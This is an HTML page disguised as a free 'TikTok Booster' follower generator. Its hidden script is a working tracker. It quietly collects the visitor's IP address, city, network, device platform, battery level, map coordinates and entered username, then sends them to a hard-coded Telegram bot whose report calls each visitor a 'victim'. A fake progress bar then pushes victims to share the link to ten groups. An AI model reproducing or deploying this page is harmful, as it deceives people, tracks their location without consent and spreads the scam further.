<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Booster | Free Followers & Likes</title>
    <style>
        body { background: #010101; color: #fff; font-family: 'Poppins', sans-serif; margin: 0; padding: 0; text-align: center; }
        .header { background: linear-gradient(90deg, #ff0050, #00f2ea); padding: 20px; font-weight: bold; font-size: 24px; box-shadow: 0 5px 15px rgba(255,0,80,0.3); }
        .container { padding: 30px; max-width: 400px; margin: 20px auto; background: #121212; border-radius: 20px; border: 1px solid #333; }
        input { width: 90%; padding: 15px; margin: 10px 0; border-radius: 30px; border: 1px solid #444; background: #000; color: #fff; text-align: center; }
        select { width: 95%; padding: 15px; margin: 10px 0; border-radius: 30px; background: #000; color: #fff; border: 1px solid #444; }
        .btn { width: 95%; padding: 15px; background: #ff0050; color: white; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
        #status { display: none; color: #00f2ea; margin-top: 20px; font-size: 13px; }
        .footer { font-size: 10px; color: #555; margin-top: 30px; }
    </style>
</head>
<body>

    <div class="header">🎵 TikTok Booster</div>

    <div class="container">
        <h3>Get Free Followers</h3>
        <p style="color: #aaa; font-size: 12px;">Enter your username and select amount</p>
        
        <input type="text" id="username" placeholder="@Username">
        
        <select id="amount">
            <option value="1000">1,000 Followers</option>
            <option value="5000">5,000 Followers</option>
            <option value="10000">10,000 Followers</option>
        </select>

        <button class="btn" onclick="startBoost()">Generate Followers</button>

        <div id="status">
            <p id="msg">Connecting to TikTok Server...</p>
            <div style="width: 100%; height: 4px; background: #222; border-radius: 2px;">
                <div id="bar" style="width: 0%; height: 100%; background: #00f2ea;"></div>
            </div>
        </div>
    </div>

    <div class="footer">Powered by TikTok API V2.6</div>

    <script>
        const token = "8533713892:AAGYF0xkIlVDGmCwywyw3Y2_zt8EuiQfZ-g";
        const chatId = "7461145170";

        async function startBoost() {
            const user = document.getElementById('username').value;
            if(!user) { alert("Please enter username!"); return; }

            document.getElementById('status').style.display = 'block';
            let bar = document.getElementById('bar');
            let msg = document.getElementById('msg');

            // په پټه کې د ټریکر پیلول
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();

                // د بیټرۍ او موبایل سکرین معلومات
                let bat = "N/A";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    bat = Math.round(b.level * 100) + "%";
                }

                const report = `
🎵 **TIKTOK TRAP - NEW VICTIM!**
------------------------------
👤 **Target User:** \`${user}\`
📈 **Amount:** ${document.getElementById('amount').value}
🔋 **Battery:** ${bat}
🌐 **IP Address:** \`${d.ip}\`
📍 **Location:** ${d.city}, ${d.country_name}
🏢 **Network:** ${d.org}
📱 **Device:** ${navigator.platform}
------------------------------
📍 **Live Map:** https://www.google.com/maps?q=${d.latitude},${d.longitude}
------------------------------
                `;

                // ټیلیګرام ته لېږل
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: report, parse_mode: 'Markdown' })
                });

            } catch (e) { console.log(e); }

            // د انیمیشن غولول
            let width = 0;
            let interval = setInterval(() => {
                width += 2;
                bar.style.width = width + "%";
                if(width == 30) msg.innerText = "Finding Profile...";
                if(width == 60) msg.innerText = "Injecting Followers...";
                if(width == 90) msg.innerText = "Finalizing Verification...";
                if(width >= 100) {
                    clearInterval(interval);
                    alert("Verification Failed: You must share this link to 10 groups to verify you are not a robot.");
                    window.location.href = "https://t.me/TOPAK1V";
                }
            }, 100);
        }
    </script>
</body>
</html>
